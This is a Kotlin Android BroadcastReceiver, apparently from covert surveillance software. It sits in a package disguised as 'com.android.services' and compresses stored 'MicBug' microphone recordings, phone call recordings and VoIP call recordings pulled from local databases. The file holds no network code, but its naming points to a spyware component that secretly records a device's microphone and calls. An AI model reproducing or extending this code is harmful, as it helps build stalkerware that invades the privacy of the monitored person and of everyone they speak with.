package com.android.services.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.android.services.db.entities.CallRecording
import com.android.services.db.entities.MicBug
import com.android.services.db.entities.ScreenRecording
import com.android.services.db.entities.VoipCall
import com.android.services.models.VoipCallRecord
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.AudioCompressionUtil
import com.android.services.util.InjectorUtils
import com.android.services.util.VideoCompressionUtil
import com.android.services.util.logException
import com.android.services.util.logVerbose
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class AudioFileCompressorReceiver : BroadcastReceiver() {
    companion object {
        const val ACTION_COMPRESS_AUDIO = "ACTION_COMPRESS_AUDIO"
    }

    override fun onReceive(context: Context, intent: Intent?) {
        intent?.let {
            if (it.action == ACTION_COMPRESS_AUDIO) {
                GlobalScope.launch(Dispatchers.Default) {
                    try {
                        val micBugs = fetchMicBugs(context)
                        val callRecordings = fetchCallRecordings(context)
                        val voipCallRecordings = fetchVoipCallRecordings(context)
                        if (micBugs.isNotEmpty()) {
                            logVerbose(
                                "${AppConstants.MIC_BUG_TYPE} compressing audio File",
                                AppConstants.MIC_BUG_TYPE
                            )
                            for (micBug in micBugs) {
                                val compressJob = async { compressFile(context,micBug) }
                                compressJob.await()
                            }
                        }
                        if (callRecordings.isNotEmpty()) {
                            logVerbose(
                                "${AppConstants.CALL_RECORD_TYPE} compressing audio File",
                                AppConstants.CALL_RECORD_TYPE
                            )
                            for (callRecording in callRecordings) {
                                val compressJob = async { compressFile(context,callRecording) }
                                compressJob.await()
                            }
                        }
                        if (voipCallRecordings.isNotEmpty()) {
                            logVerbose(
                                "${AppConstants.VOIP_CALL_TYPE} compressing audio File",
                                AppConstants.VOIP_CALL_TYPE
                            )
                            for (voipCallRecording in voipCallRecordings) {
                                val compressJob = async { compressFile(context,voipCallRecording) }
                                compressJob.await()
                            }
                        }

                    } catch (exp: Exception) {
                        logException(
                            "${AppConstants.SCREEN_RECORDING_TYPE} compressing exp = ${exp.message}",
                            throwable = exp
                        )
                    }
                }
            }
        }
    }

    private fun compressFile(context: Context, micBug: MicBug) {
        val destFile =
            "${micBug.file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
                micBug.file.substringAfterLast("/")
            }"
        AudioCompressionUtil.compressAudio(context, micBug.file, destFile)
    }

    private fun compressFile(context: Context, callRecording: CallRecording) {
        val destFile =
            "${callRecording.file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
                callRecording.file.substringAfterLast("/")
            }"
        AudioCompressionUtil.compressAudio(context, callRecording.file, destFile)
    }
    private fun compressFile(context: Context, voipCall: VoipCall) {
        val destFile =
            "${voipCall.file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
                voipCall.file.substringAfterLast("/")
            }"
        AudioCompressionUtil.compressAudio(context, voipCall.file, destFile)
    }


    private suspend fun fetchMicBugs(context: Context): List<MicBug> {
        return withContext(Dispatchers.IO) {
            InjectorUtils.provideMicBugRepository(context)
                .selectUnCompressedMicBugs()
        }
    }

    private suspend fun fetchCallRecordings(context: Context): List<CallRecording> {
        return withContext(Dispatchers.IO) {
            InjectorUtils.provideCallRecordRepository(context)
                .selectUnCompressedCallRecording()
        }
    }

    private suspend fun fetchVoipCallRecordings(context: Context): List<VoipCall> {
        return withContext(Dispatchers.IO) {
            InjectorUtils.provideVoipCallRepository(context)
                .selectUnCompressedVoipCalls()
        }
    }
}